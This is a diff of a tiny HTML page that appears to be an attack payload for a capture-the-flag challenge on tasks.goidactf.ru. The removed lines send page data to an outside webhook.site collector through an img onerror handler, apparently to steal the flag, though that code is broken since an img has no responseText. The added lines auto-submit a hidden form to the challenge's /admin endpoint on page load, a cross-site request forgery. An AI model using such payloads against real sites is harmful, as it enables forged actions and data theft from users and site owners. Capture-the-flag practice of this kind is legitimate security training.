@@ -1,7 +1,9 @@
 <!DOCTYPE html>
 <html>
 <body>
-<img src="http://tasks.goidactf.ru:20448/flag"
-     onerror="this.src='https://webhook.site/95d83a71-39f6-4ff1-8670-a9dcf8fcb647?f='+encodeURIComponent(this.responseText)">
+<form action="http://tasks.goidactf.ru:20448/admin" method="GET"></form>
+<script>
+document.forms[0].submit();
+</script>
 </body>
 </html>
